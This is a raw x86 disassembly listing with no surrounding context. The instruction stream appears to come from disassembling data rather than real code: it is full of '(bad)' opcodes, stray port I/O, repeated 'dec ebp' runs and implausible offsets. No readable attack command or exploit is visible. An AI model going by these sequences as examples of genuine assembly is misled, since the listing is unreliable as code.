  425d0d:	adc    BYTE PTR [edi-0x75587f76],0x53
  425d14:	jle    0x425d03
  425d16:	(bad)  
  425d17:	or     eax,0xb20c07b2
  425d1c:	mov    ah,0x29
  425d1e:	call   DWORD PTR [esp+ebp*8-0x75687f02]
  425d25:	and    BYTE PTR [edi-0x1281ac76],0xc6
  425d2c:	or     eax,0xb229b4b2
  425d31:	pop    es
  425d32:	or     al,0xff
  425d34:	xchg   esp,eax
  425d35:	in     al,dx
  425d36:	(bad)  
  425d37:	push   eax
  425d38:	xend   
  425d3b:	dec    ebp
  425d3c:	dec    ebp
  425d3d:	dec    ebp
  425d3e:	add    DWORD PTR [edi+0x52],ecx
  425d41:	dec    ebp
  425d42:	dec    ebp
  425d43:	dec    ebp
  425d44:	or     al,BYTE PTR [eax-0xf7f7589]
  425d4a:	mov    ah,dl
  425d4c:	or     eax,0x53fc53a3
  425d51:	adc    DWORD PTR [edx-0x454df37a],esi
  425d57:	sub    edi,edi
  425d59:	mov    dl,0xa
  425d5b:	xor    BYTE PTR [edi+0x2d],0x1
  425d5f:	adc    ch,dh
  425d61:	lea    ecx,[ebp-0x327f6973]
  425d67:	cmp    cl,BYTE PTR ds:[ebp+0x4d814d8d]
  425d6e:	xchg   edi,eax
  425d6f:	and    eax,0x5055f080
  425d74:	cmp    al,BYTE PTR [eax-0xf7f7b89]
  425d7a:	stc    
  425d7b:	or     DWORD PTR [esi-0x3],eax
  425d7e:	or     al,0xb2
  425d80:	mov    esi,0x84f0800c
  425d85:	adc    BYTE PTR [edi+0x537c53f9],0x72
  425d8c:	push   edi
  425d8e:	stos   BYTE PTR es:[edi],al
  425d8f:	dec    ebp
  425d90:	xlat   BYTE PTR ds:[ebx]
  425d91:	xor    eax,0x4d29bab2
  425d96:	xlat   BYTE PTR ds:[ebx]
  425d97:	inc    ebp
  425d98:	xchg   ah,cl
  425d9a:	add    eax,0x77804d4d
  425d9f:	test   BYTE PTR [eax+0x4609f9f0],al
  425da5:	std    
  425da6:	or     al,0xb2
  425da8:	mov    esi,0x84f0800c
  425dad:	adc    BYTE PTR [edi+0x537c53f9],0x72
  425db4:	push   edi
  425db6:	stos   BYTE PTR es:[edi],al
  425db7:	dec    ebp
  425db8:	xlat   BYTE PTR ds:[ebx]
  425db9:	push   ebp
  425dba:	mov    dl,0xba
  425dbc:	sub    DWORD PTR [ebp-0x29],ecx
  425dbf:	cmp    eax,0x4d059886
  425dc4:	dec    ebp
  425dc5:	xor    BYTE PTR [edi-0x76],0x80
  425dc9:	lock mov dl,BYTE PTR [ebx+0x11]
  425dcd:	mov    dl,0xba
  425dcf:	sub    DWORD PTR [ebx-0x4],edx
  425dd2:	mov    dl,0x86
  425dd4:	or     al,0xff
  425dd6:	mov    dl,0x80
  425dd8:	lock mov al,BYTE PTR [eax+0x51538a97]
  425ddf:	mov    dl,0xbe
  425de1:	or     al,0x53
  425de3:	xchg   esp,eax
  425de4:	mov    dl,0xf8
  425de6:	sub    edi,edi
  425de8:	(bad)  
  425de9:	in     al,dx
  425dea:	mov    dl,0x80
  425dec:	lock mov al,BYTE PTR [eax+0x51538a97]
  425df3:	mov    dl,0xbe
  425df5:	or     al,0x53
  425df7:	xchg   esp,eax
  425df8:	mov    dl,0xf8
  425dfa:	sub    edi,edi
  425dfc:	(bad)  
  425dfd:	in     al,dx
  425dfe:	mov    dl,0x80
  425e00:	lock mov al,BYTE PTR [eax+0x51538a97]
  425e07:	mov    dl,0xbe
  425e09:	or     al,0x53
  425e0b:	xchg   esp,eax
  425e0c:	mov    dl,0xf8
  425e0e:	sub    edi,edi
  425e10:	(bad)  
  425e11:	in     al,dx
  425e12:	mov    dl,0x50
  425e14:	dec    edi
  425e15:	push   edx
  425e16:	dec    ebp
  425e17:	dec    ebp
  425e18:	dec    ebp
  425e19:	xor    BYTE PTR [edi+0x55],0x80
  425e1d:	lea    eax,[eax-0x687f7910]
  425e23:	xchg   BYTE PTR [ebx+0x51],dl
  425e26:	push   ebx
  425e27:	xchg   esp,eax
  425e28:	mov    dl,0xbe
  425e2a:	or     al,0xb2
  425e2c:	clc    
  425e2d:	sub    edi,edi
  425e2f:	(bad)  
  425e30:	push   eax
  425e31:	xend   
  425e34:	dec    ebp
  425e35:	dec    ebp
  425e36:	dec    ebp
  425e37:	xor    BYTE PTR [edi+0x21],0x80
  425e3b:	lea    eax,[eax-0x687f7510]
  425e41:	mov    dl,BYTE PTR [ebx+0x51]
  425e44:	mov    dl,0xbe
  425e46:	or     al,0x80
  425e48:	ins    DWORD PTR es:[edi],dx
  425e49:	or     dl,BYTE PTR [ebx-0x6c]
  425e4c:	mov    dl,0xf8
  425e4e:	sub    edi,edi
  425e50:	(bad)  
  425e51:	push   eax
  425e52:	xend   
  425e55:	dec    ebp
  425e56:	dec    ebp
  425e57:	dec    ebp
  425e58:	xor    BYTE PTR [edi+0x1d],0x80
  425e5c:	lock sbb eax,0xbab21153
  425e62:	sub    DWORD PTR [ebx-0x4],edx
  425e65:	mov    dl,0x86
  425e67:	or     al,0xff
  425e69:	mov    dl,0x80
  425e6b:	lock mov al,BYTE PTR [eax-0x6bac7569]
  425e72:	push   ebx
  425e73:	push   ecx
  425e74:	mov    dl,0xf8
  425e76:	sub    DWORD PTR [edx-0x100f342],esi
  425e7c:	adc    BYTE PTR [edi-0x75587f76],0x53
  425e83:	jle    0x425e37
  425e85:	pop    es
  425e86:	or     al,0xed
  425e88:	(bad)  
  425e89:	or     eax,0xff29b4b2
  425e8e:	xchg   esp,eax
  425e8f:	in     al,dx
  425e90:	(bad)  
  425e91:	push   eax
  425e92:	xend   
  425e95:	dec    ebp
  425e96:	dec    ebp
  425e97:	dec    ebp
  425e98:	xor    BYTE PTR [edi-0x76],0x80
  425e9c:	lock mov ch,ch
  425e9f:	add    eax,0x29bab20d
  425ea4:	push   ebx
  425ea5:	cld    
  425ea6:	mov    dl,0x86
  425ea8:	or     al,0xff
  425eaa:	mov    dl,0x80
  425eac:	lock mov al,BYTE PTR [eax-0x3d127569]
  425eb3:	or     eax,0xf8b25153
  425eb8:	sub    DWORD PTR [edx-0x100f342],esi
  425ebe:	in     al,dx
  425ebf:	mov    dl,0x80
  425ec1:	lock mov al,BYTE PTR [eax-0x3d127569]
  425ec8:	or     eax,0xf8b25153
  425ecd:	sub    DWORD PTR [edx-0x100f342],esi
  425ed3:	add    DWORD PTR [eax],ebx
  425ed5:	push   edx
  425ed6:	dec    ebp
  425ed7:	dec    ebp
  425ed8:	dec    ebp
  425ed9:	stos   BYTE PTR es:[edi],al
  425eda:	adc    BYTE PTR [edi-0x75587f76],0xec
  425ee1:	mov    dl,0x53
  425ee3:	jle    0x425ee6
  425ee5:	lock adc DWORD PTR [eax+0x41],0x4f
  425eea:	aad    0x4d
  425eec:	dec    ebp
  425eed:	dec    ebp
  425eee:	xor    BYTE PTR [edi+0x2d],0xed
  425ef2:	(bad)  
  425ef3:	or     eax,0xb20c07b2
  425ef8:	mov    ah,0x29
  425efa:	call   DWORD PTR [ecx+eax*1-0x727277f0]
  425f01:	lea    eax,[eax-0x72c5c133]
  425f07:	lea    ebp,[edx+0x4d814d96]
  425f0d:	xchg   edi,eax
  425f0e:	and    eax,0xbdd56a4f
  425f13:	xor    BYTE PTR [edi-0x79],0x80
  425f17:	lock xor cl,BYTE PTR [ecx]
  425f1a:	inc    esi
  425f1b:	std    
  425f1c:	or     al,0xb2
  425f1e:	mov    esi,0x80b6800c
  425f23:	std    
  425f24:	xor    BYTE PTR [edi-0x79],0x80
  425f28:	xchg   edi,eax
  425f29:	xor    dl,BYTE PTR [ebx+0x72]
  425f2c:	push   ebx
  425f2d:	sub    dh,BYTE PTR [edx+0x77802984]
  425f33:	and    edi,edi
  425f35:	inc    BYTE PTR [eax+0xada6371]
  425f3b:	adc    BYTE PTR [edi-0x7faa3bab],0xc
  425f42:	and    BYTE PTR [edi-0xda707f],0x10
  425f49:	and    eax,0xc87780ef
  425f4e:	xor    al,0x8b
  425f51:	or     DWORD PTR [esi-0x3],eax
  425f54:	or     al,0xb2
  425f56:	mov    esi,0xc8f0800c
  425f5b:	and    BYTE PTR [edi+0x537c538b],0xa4
  425f62:	mov    dl,0xba
  425f64:	sub    DWORD PTR [eax+0x74ff71f0],eax
  425f6a:	in     al,dx
  425f6b:	std    
  425f6c:	xor    BYTE PTR [edi+0x21],0x80
  425f70:	sbb    eax,0x500a0063
  425f75:	lock jno 0x425f5c
  425f78:	jl     0x425f3e
  425f7a:	outs   dx,DWORD PTR ds:[esi]
  425f7b:	adc    BYTE PTR [edi+0x21778055],0x80
  425f82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425f83:	xor    BYTE PTR [eax+0x50659fec],0x1d
  425f8a:	sbb    BYTE PTR ds:0x80eca680,0x2e
  425f91:	lea    ecx,[ebp+0x71f0508d]
  425f97:	and    BYTE PTR [esi+0x4381a780],0x11
  425f9e:	and    BYTE PTR [edi-0x7f00af11],0x8d
  425fa5:	and    BYTE PTR [esi-0x7fc28214],0x77
  425fac:	xchg   DWORD PTR [eax-0x10],edx
  425faf:	scas   eax,DWORD PTR es:[edi]
  425fb0:	xor    al,0x32
  425fb3:	or     DWORD PTR [esi-0x3],eax
  425fb6:	or     al,0xb2
  425fb8:	mov    esi,0x87f0800c
  425fbd:	and    BYTE PTR [edi+0x537c5332],0xa4
  425fc4:	mov    dl,0xba
  425fc6:	sub    edi,edi
  425fc8:	je     0x42601a
  425fca:	ja     0x426011
  425fcc:	xor    BYTE PTR [edi+0x71],0xbe
  425fd0:	lds    edi,FWORD PTR [edx]
  425fd2:	lea    ecx,[ebp-0x7f788880]
  425fd8:	lock xor cl,BYTE PTR [ecx]
  425fdb:	inc    esi
  425fdc:	std    
  425fdd:	or     al,0xb2
  425fdf:	mov    esi,0x87f0800c
  425fe4:	and    BYTE PTR [edi+0x29bab232],0x80
  425feb:	lock adc eax,0xa4537c53
  425ff1:	in     eax,dx
  425ff2:	mov    dl,0x8b
  425ff4:	push   DWORD PTR [esi+esi*4-0x42]
  425ff8:	arpl   WORD PTR [edx-0x72f412f7],si
  425ffe:	lea    ecx,[ebp+0x171a780]
  426004:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426005:	jae    0x425ff6
  426007:	inc    ebx
  426008:	std    
  426009:	push   eax
  42600a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42600b:	xor    eax,0x803df050
  426010:	lock test DWORD PTR [eax+0x46097a77],0x86b20cb2
  42601b:	or     al,0x80
  42601d:	ja     0x426016
  42601f:	and    BYTE PTR [edi+0x2984b27a],0x80
  426026:	ja     0x425ff0
  426028:	push   ebx
  426029:	sub    dl,BYTE PTR [ebx-0x5c]
  42602c:	call   DWORD PTR [ecx]
  42602e:	and    BYTE PTR [edi-0x7db9f675],0xc
  426035:	push   eax
  426036:	ja     0x42608d
  426038:	xor    BYTE PTR [edi-0x38],0x6e
  42603c:	out    0x55,eax
  42603e:	in     eax,dx
  42603f:	mov    dl,0xa6
  426041:	mov    dl,0xc4
  426043:	or     al,0x80
  426045:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426046:	mov    edx,DWORD PTR [ebx-0x5c]
  426049:	xor    BYTE PTR [edi+0x55b79455],ah
  42604f:	and    BYTE PTR [edi-0x740f7f38],0x9
  426056:	inc    esi
  426057:	adc    DWORD PTR [edx+esi*4],ecx
  42605a:	test   BYTE PTR [ecx],ch
  42605c:	xor    BYTE PTR [edi-0x38],0xb2
  426060:	mov    esi,0x8bf0800c
  426065:	push   ebx
  426066:	jo     0x42601a
  426068:	test   BYTE PTR [ecx],ch
  42606a:	xor    BYTE PTR [edi+0x55],0x53
  42606e:	lods   al,BYTE PTR ds:[esi]
  42606f:	jmp    DWORD PTR [eax+0x935f080]
  426075:	pop    esp
  426076:	xor    BYTE PTR [ebx+0x74],al
  426079:	xor    esi,DWORD PTR [edx+0x50f7f080]
  42607f:	ja     0x4260d6
  426081:	xor    BYTE PTR [edi+0x7a],0x9
  426085:	inc    esi
  426086:	mov    dl,0xc
  426088:	mov    dl,0x86
  42608a:	or     al,0x80
  42608c:	ja     0x426085
  42608e:	and    BYTE PTR [edi+0x2984b27a],0x80
  426095:	ja     0x4260cc
  426097:	or     DWORD PTR [ebp+ecx*4-0x33],ebx
  42609b:	add    eax,0xa6a453a7
  4260a0:	adc    ebp,ecx
  4260a2:	mov    dl,0xa6
  4260a4:	xchg   esp,eax
  4260a5:	xchg   BYTE PTR [ebx+0x70],dl
  4260a8:	xchg   BYTE PTR fs:[edi+0x36092643],cl
  4260af:	mov    dl,0xc
  4260b1:	mov    dl,0x84
  4260b3:	or     al,0x57
  4260b5:	fstp   DWORD PTR [eax-0x21]
  4260b8:	adc    DWORD PTR [ebx+0x11],edx
  4260bb:	addr16 out 0x58,al
  4260be:	fist   WORD PTR [ecx]
  4260c0:	xlat   BYTE PTR ds:[ebx]
  4260c1:	aaa    
  4260c2:	arpl   WORD PTR [ecx],dx
  4260c4:	xlat   BYTE PTR ds:[ebx]
  4260c5:	dec    esi
  4260c6:	or     BYTE PTR [eax+eax*4],0xf0
  4260ca:	jno    0x4260b8
  4260cc:	cmp    al,BYTE PTR [eax+0x65ed55f0]
  4260d2:	out    dx,eax
  4260d3:	(bad)  
  4260d4:	aad    0xe
  4260d6:	or     BYTE PTR [eax+eax*4],0xf0
  4260da:	jno    0x4260c8
  4260dc:	cmp    al,BYTE PTR [eax+0x77eceff0]
  4260e2:	push   ebp
  4260e3:	xor    BYTE PTR [eax],0x3a
  4260e6:	out    dx,eax
  4260e7:	in     eax,dx
  4260e8:	ja     0x42611f
  4260ea:	or     al,0x4d
  4260ec:	lock cmp eax,0x4d234f09
  4260f2:	dec    ebp
  4260f3:	dec    ebp
  4260f4:	les    ebp,FWORD PTR [edi]
  4260f6:	xchg   BYTE PTR fs:[edi+0x77802643],cl
  4260fd:	adc    eax,0x7c45773a
  426102:	ja     0x42616e
  426104:	rcr    BYTE PTR [eax-0x21],1
  426107:	adc    DWORD PTR [eax-0x59],edx
  42610a:	jbe    0x42608c
  42610c:	ja     0x426178
  42610e:	xor    al,0x76
  426111:	or     DWORD PTR [esi-0x3],eax
  426114:	or     al,0xb2
  426116:	mov    esi,0x6af0800c
  42611b:	and    BYTE PTR [edi+0x29bab276],0x80
  426122:	lock and DWORD PTR [eax+0x537c5330],eax
  426129:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42612a:	push   DWORD PTR [ecx+eax*1+0x75]
  42612e:	mov    dl,0xe5
  426130:	xor    al,0x45
  426133:	arpl   di,bp
  426135:	rcl    DWORD PTR [ebp-0x80],cl
  426138:	ja     0x4261ab
  42613a:	in     al,dx
  42613b:	ja     0x426152
  42613d:	push   eax
  42613e:	ja     0x4261b1
  426140:	sub    BYTE PTR [ebp-0x12],0x50
  426144:	ja     0x42615b
  426146:	xor    BYTE PTR [edi-0x79],0x80
  42614a:	lock xor cl,BYTE PTR [ecx]
  42614d:	inc    esi
  42614e:	std    
  42614f:	or     al,0xb2
  426151:	mov    esi,0x87f0800c
  426156:	and    BYTE PTR [edi+0x53a45332],0x7c
  42615d:	push   DWORD PTR [edx+esi*4-0x46]
  426161:	sub    DWORD PTR [edi+0x77],ebx
  426164:	adc    eax,0xdbf4f09
  426169:	dec    ebp
  42616a:	dec    ebp
  42616b:	xor    al,0x8a
  42616e:	adc    BYTE PTR [edi-0x4daeac76],0xbe
  426175:	or     al,0xe2
  426177:	or     eax,0xb2f7539d
  42617c:	clc    
  42617d:	sub    edi,edi
  42617f:	inc    BYTE PTR [eax-0x587f7569]
  426185:	mov    dl,BYTE PTR [ebx+0x7e]
  426188:	mov    dl,0x7
  42618a:	or     al,0x53
  42618c:	xor    BYTE PTR [edx-0x6b00d64c],0xec
  426193:	inc    BYTE PTR [eax-0x587f7569]
  426199:	mov    dl,BYTE PTR [ebx+0x7e]
  42619c:	mov    dl,0x7
  42619e:	or     al,0x53
  4261a0:	xor    BYTE PTR [edx-0x6b00d64c],0xec
  4261a7:	inc    BYTE PTR [eax-0x587f7569]
  4261ad:	mov    dl,BYTE PTR [ebx+0x7e]
  4261b0:	push   ebx
  4261b1:	xor    BYTE PTR [edx-0x4b4df3f9],0x29
  4261b8:	call   DWORD PTR [esp+ebp*8+0x520150fe]
  4261bf:	dec    ebp
  4261c0:	dec    ebp
  4261c1:	dec    ebp
  4261c2:	xor    al,0x81
  4261c5:	adc    BYTE PTR [edi-0x79587f7a],0x53
  4261cc:	jle    0x426221
  4261ce:	xor    BYTE PTR [edx-0x4b4df3f9],0x29
  4261d5:	call   DWORD PTR [eax+edx*2+0x4dd51841]
  4261dc:	dec    ebp
  4261dd:	dec    ebp
  4261de:	xor    al,0x21
  4261e1:	xor    BYTE PTR [eax],0x80
  4261e4:	xchg   edi,eax
  4261e5:	mov    al,BYTE PTR [eax+0x7f808aa7]
  4261eb:	or     dl,BYTE PTR [ebx+0x7e]
  4261ee:	push   ebx
  4261ef:	xor    BYTE PTR [edx-0x4b4df3f9],0x29
  4261f6:	call   DWORD PTR [eax+edx*2+0x4dd51841]
  4261fd:	dec    ebp
  4261fe:	dec    ebp
  4261ff:	xor    al,0x1d
  426202:	adc    BYTE PTR [edi-0x4d08ace3],0xf8
  426209:	sub    DWORD PTR [ebx+0x51],edx
  42620c:	mov    dl,0xbe
  42620e:	or     al,0xff
  426210:	inc    BYTE PTR [eax-0x587f7569]
  426216:	mov    dl,BYTE PTR [ebx-0x7e]
  426219:	xor    BYTE PTR [edi-0x76],0x53
  42621d:	jle    0x4261d1
  42621f:	mov    ah,0x29
  426221:	mov    dl,0x7
  426223:	or     al,0xff
  426225:	xchg   esp,eax
  426226:	and    BYTE PTR [edi-0x1203ac76],0xc6
  42622d:	or     eax,0xb20c86b2
  426232:	mov    ah,0x29
  426234:	push   DWORD PTR [esp+ebp*8-0x9]
  426238:	push   eax
  426239:	inc    ecx
  42623a:	sbb    ch,dl
  42623c:	dec    ebp
  42623d:	dec    ebp
  42623e:	dec    ebp
  42623f:	xor    al,0x8a
  426242:	adc    BYTE PTR [edi-0x4daeac76],0xbe
  426249:	or     al,0xe2
  42624b:	or     eax,0xb2f7539d
  426250:	clc    
  426251:	sub    edi,edi
  426253:	inc    BYTE PTR [eax-0x587f7569]
  426259:	mov    dl,BYTE PTR [ebx+0x7e]
  42625c:	mov    dl,0x7
  42625e:	or     al,0x53
  426260:	xor    BYTE PTR [edx-0x6b00d64c],0xec
  426267:	inc    BYTE PTR [eax-0x587f7569]
  42626d:	mov    dl,BYTE PTR [ebx+0x7e]
  426270:	mov    dl,0x7
  426272:	or     al,0x53
  426274:	xor    BYTE PTR [edx-0x6b00d64c],0xec
  42627b:	inc    BYTE PTR [ecx]
  42627d:	xchg   edi,eax
  42627e:	adc    DWORD PTR [eax+0x16],0x1
  426282:	aad    0x4d
  426284:	dec    ebp
  426285:	dec    ebp
  426286:	add    DWORD PTR [ecx],eax
  426288:	push   edx
  426289:	dec    ebp
  42628a:	dec    ebp
  42628b:	dec    ebp
  42628c:	xchg   esi,eax
  42628d:	xor    al,0x8a
  426290:	adc    BYTE PTR [edi-0x7faeac76],0xd7
  426297:	sub    eax,0xbeb2f753
  42629c:	or     al,0xb2
  42629e:	clc    
  42629f:	sub    edi,edi
  4262a1:	(bad)  
  4262a2:	xchg   esi,eax
  4262a3:	add    DWORD PTR [eax+ecx*4-0x73],ecx
  4262a7:	lea    ecx,[ebp+0x3e4c800a]
  4262ad:	cmp    cl,BYTE PTR [ebp+0x4d814d8d]
  4262b3:	xchg   edi,eax
  4262b4:	and    eax,0x3acd4c80
  4262b9:	lea    ecx,[ebp-0x7fde88b0]
  4262bf:	ja     0x4262b0
  4262c1:	sub    bh,0xec
  4262c4:	lock and DWORD PTR [eax-0x10],edx
  4262c8:	and    DWORD PTR [eax-0x687f3710],eax
  4262ce:	mov    ecx,DWORD PTR [ecx]
  4262d0:	inc    esi
  4262d1:	mov    dh,0xc
  4262d3:	mov    dl,0x7
  4262d5:	or     al,0x80
  4262d7:	xchg   edi,eax
  4262d8:	enter  0xd780,0x8b
  4262dc:	push   ebx
  4262dd:	or     esi,DWORD PTR [edx-0x687fd608]
  4262e3:	enter  0x2a53,0xff
  4262e7:	push   ecx
  4262e8:	adc    bh,0x8b
  4262eb:	or     DWORD PTR [esi-0x3e],eax
  4262ee:	or     al,0xb2
  4262f0:	mov    BYTE PTR [eax+eax*4],cl
  4262f3:	xlat   BYTE PTR ds:[ebx]
  4262f4:	enter  0xa780,0x8b
  4262f8:	push   ebx
  4262f9:	pushf  
  4262fa:	push   ebx
  4262fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4262fc:	call   DWORD PTR [esp+ebp*8-0x37687f02]
  426303:	mov    dl,0x2
  426305:	sub    DWORD PTR [eax+0x46098bd7],eax
  42630b:	ret    0xb20c
  42630e:	mov    BYTE PTR [eax+eax*4],cl
  426311:	xlat   BYTE PTR ds:[ebx]
  426312:	enter  0xa780,0x8b
  426316:	push   ebx
  426317:	pushf  
  426318:	push   ebx
  426319:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42631a:	call   DWORD PTR [esp+ebp*8-0x37687f02]
  426321:	mov    dl,0x2
  426323:	sub    DWORD PTR [eax+0x46098bd7],eax
  426329:	ret    0xb20c
  42632c:	mov    BYTE PTR [eax+eax*4],cl
  42632f:	xlat   BYTE PTR ds:[ebx]
  426330:	enter  0x9c53,0x80
  426334:	out    0x8b,eax
  426336:	push   ebx
  426337:	dec    ebp
  426338:	call   FWORD PTR [esp+ebp*8+0x4d0a96fe]
  42633f:	xlat   BYTE PTR ds:[ebx]
  426340:	and    DWORD PTR [edx-0x6979d6fe],esi
  426346:	xchg   DWORD PTR [ebp+0x4d],ecx
  426349:	xor    BYTE PTR [edi-0x51],0xab
  42634d:	test   eax,0x81fb70a3
  426352:	lea    edx,[edi-0x78127880]
  426358:	inc    ebp
  426359:	xchg   ebx,eax
  42635a:	cdq    
  42635b:	fwait
  42635c:	push   ebx
  42635d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42635e:	push   ebx
  42635f:	jo     0x4263dd
  426361:	ja     0x4262e5
  426363:	fstp   DWORD PTR [eax-0x21]
  426366:	adc    DWORD PTR [esi-0x7a],ebx
  426369:	pop    DWORD PTR [ebx+0x26]
  42636c:	push   eax
  42636d:	ja     0x4262f2
  42636f:	jl     0x4263e8
  426371:	xchg   ah,ah
  426373:	pop    eax
  426374:	fist   WORD PTR [ecx]
  426376:	push   eax
  426377:	ja     0x426300
  426379:	jl     0x4263f2
  42637b:	xchg   esi,esi
  42637d:	mov    ds:0x777c386f,eax
  426382:	enter  0xe9f6,0x6f
  426386:	cmp    BYTE PTR [edi+esi*2+0x32],bh
  42638a:	cli    
  42638b:	and    al,0x6f
  42638d:	cmp    BYTE PTR [edi+esi*2+0x32],bh
  426391:	hlt    
  426392:	and    al,0x6f
  426394:	cmp    BYTE PTR [edi+esi*2-0x75],bh
  426398:	mul    BYTE PTR [esi+ebp*8]
  42639b:	cmp    BYTE PTR [ecx],al
  42639d:	ja     0x42638d
  42639f:	push   eax
  4263a0:	ja     0x42632d
  4263a2:	xor    BYTE PTR [edi+0x1d],0x80
  4263a6:	bound  esi,QWORD PTR [esi]
  4263a8:	cmp    cl,BYTE PTR [ebp+0x1d77808d]
  4263ae:	xor    al,0x1d
  4263b1:	or     ch,0x2e
  4263b4:	cmp    cl,BYTE PTR [ebp-0x7f8e7f73]
  4263ba:	pop    ebp
  4263bb:	in     al,dx
  4263bc:	out    0x65,al
  4263be:	adc    BYTE PTR [edi+0x26508082],0x3a
  4263c5:	lea    ecx,[ebp-0x7f0618b0]
  4263cb:	out    0x83,eax
  4263cd:	or     DWORD PTR [esi-0x7b],eax
  4263d0:	or     al,0xb2
  4263d2:	popa   
  4263d3:	or     al,0x80
  4263d5:	out    0x82,eax
  4263d7:	and    BYTE PTR [edi-0x583d5d7d],0xc7
  4263de:	add    al,0xd4
  4263e0:	push   ebx
  4263e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4263e2:	mov    dl,0xbc
  4263e4:	sub    DWORD PTR [eax+0x6394ff5f],eax
  4263ea:	pushf  
  4263eb:	xlat   BYTE PTR ds:[ebx]
  4263ec:	push   edx
  4263ed:	sbb    BYTE PTR [ecx],0x50
  4263f0:	xchg   edi,eax
  4263f1:	mov    eax,DWORD PTR [eax-0x687fea69]
  4263f7:	jno    0x426379
  4263f9:	xchg   edi,eax
  4263fa:	and    DWORD PTR [ecx],eax
  4263fc:	xchg   edi,eax
  4263fd:	test   BYTE PTR [edx-0x697428b3],ch
  426403:	or     bl,BYTE PTR [ecx+0x11dd74d]
  426409:	ja     0x426404
  42640b:	dec    ebp
  42640c:	xlat   BYTE PTR ds:[ebx]
  42640d:	out    dx,eax
  42640e:	dec    ebp
  42640f:	xlat   BYTE PTR ds:[ebx]
  426410:	enter  0xd74d,0x32
  426414:	dec    ebp
  426415:	xlat   BYTE PTR ds:[ebx]
  426416:	xchg   DWORD PTR [edx],ecx
  426418:	add    DWORD PTR [edi-0x76],esi
  42641b:	or     al,BYTE PTR [esi+0x4d4d4bab]
  426421:	push   eax
  426422:	ja     0x426441
  426424:	xor    BYTE PTR [edi+0x1d],0x80
  426428:	lock and eax,0x80159250
  42642e:	ja     0x426455
  426430:	jl     0x4263bf
  426432:	in     al,dx
  426433:	lea    ecx,[ebp-0x7b887f73]
  426439:	xor    al,0x25
  42643c:	push   eax
  42643d:	xchg   edx,eax
  42643e:	out    dx,al
  42643f:	xor    BYTE PTR [edi+0x71],0x80
  426443:	lock and eax,0x80ef9250
  426449:	ja     0x426460
  42644b:	xor    al,0x25
  42644e:	push   eax
  42644f:	xchg   edx,eax
  426450:	and    DWORD PTR [eax+0x6d7c2577],eax
  426456:	and    eax,0x8d8d8d3a
  42645b:	les    ebx,FWORD PTR [edi]
  42645d:	xor    BYTE PTR [edi+0x1d],0x80
  426461:	lock sbb eax,0x3a2ecd80
  426467:	lea    ecx,[ebp+0x3a265080]
  42646d:	lea    ecx,[ebp+0x3a438d80]
  426473:	push   eax
  426474:	ja     0x426400
  426476:	xor    BYTE PTR [edi-0x76],0xab
  42647a:	test   eax,0x1dfb70a3
  42647f:	lea    edx,[edi+0x77808780]
  426485:	and    DWORD PTR [edx-0x72c5c179],esp
  42648b:	lea    edx,[ebx-0x9986467]
  426491:	and    al,0x6f
  426493:	cmp    BYTE PTR [ecx],cl
  426495:	dec    edi
  426496:	mov    esi,0x808d8da6
  42649b:	ja     0x42650e
  42649d:	addr16 cmc 
  42649f:	and    al,0x6f
  4264a1:	cmp    BYTE PTR [ecx],cl
  4264a3:	dec    edi
  4264a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4264a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4264a6:	lea    ecx,[ebp-0x26788884]
  4264ac:	pop    eax
  4264ad:	fist   WORD PTR [ecx]
  4264af:	pop    esi
  4264b0:	xchg   BYTE PTR [edi+0x77502643],cl
  4264b6:	xor    bh,BYTE PTR [edi+esi*2-0x7]
  4264ba:	in     al,0x58
  4264bc:	fist   WORD PTR [ecx]
  4264be:	push   eax
  4264bf:	ja     0x426447
  4264c1:	xor    BYTE PTR [edi-0x11],0x50
  4264c5:	ja     0x42648f
  4264c7:	xor    BYTE PTR [edi-0x38],0x80
  4264cb:	int    0x86
  4264cd:	cmp    cl,BYTE PTR [ebp-0x7f727f73]
  4264d3:	lea    edx,[eax+0x77]
  4264d6:	mov    esp,DWORD PTR [eax+0x7f]
  4264d9:	cmp    BYTE PTR [ebp+0x38975e8d],cl
  4264df:	lea    ecx,[ebp+0x5a7750b9]
  4264e5:	in     eax,dx
  4264e6:	push   0xd
  4264e8:	mov    ecx,0x80d17750
  4264ed:	mov    dl,0xb9
  4264ef:	push   eax
  4264f0:	ja     0x426508
  4264f2:	pop    esi
  4264f3:	int3   
  4264f4:	cmp    BYTE PTR [ebp-0x46087f73],cl
  4264fa:	push   eax
  4264fb:	xchg   edi,eax
  4264fc:	loope  0x4264ff
  4264fe:	push   edx
  4264ff:	or     al,0x1
  426501:	lahf   
  426502:	stos   BYTE PTR es:[edi],al
  426503:	cmp    BYTE PTR [esi-0x47],0x50
  426507:	xchg   edi,eax
  426508:	push   ds
  426509:	adc    BYTE PTR [ecx+edi*4-0x121668b0],0xfb
  426511:	jle    0x4264cc
  426513:	push   eax
  426514:	xchg   edi,eax
  426515:	int    0x1
  426517:	xchg   esi,eax
  426518:	push   ebp
  426519:	add    BYTE PTR [ebp-0x1518af47],0xed
  426520:	jl     0x42659c
  426522:	mov    ecx,0x10fe750
  426527:	fistp  WORD PTR [ecx-0x47]
  42652a:	push   eax
  42652b:	out    0x4c,eax
  42652d:	mov    ecx,0xb9107750
  426532:	push   eax
  426533:	xlat   BYTE PTR ds:[ebx]
  426534:	pop    DWORD PTR [eax+0x7750b974]
  42653a:	inc    ecx
  42653b:	mov    ecx,0x4d6d1850
  426540:	dec    ebp
  426541:	dec    ebp
  426542:	in     eax,dx
  426543:	push   0x62
  426545:	mov    ecx,0x4dd84f50
  42654a:	dec    ebp
  42654b:	dec    ebp
  42654c:	add    DWORD PTR [edx+0x4f50b985],edx
  426552:	jne    0x4265a1
  426554:	dec    ebp
  426555:	dec    ebp
  426556:	in     eax,dx
  426557:	push   0xffffffd4
  426559:	mov    ecx,0x4d794f50
  42655e:	dec    ebp
  42655f:	dec    ebp
  426560:	add    DWORD PTR [edx+0x4f50b971],edx
  426566:	jge    0x4265b5
  426568:	dec    ebp
  426569:	dec    ebp
  42656a:	in     eax,dx
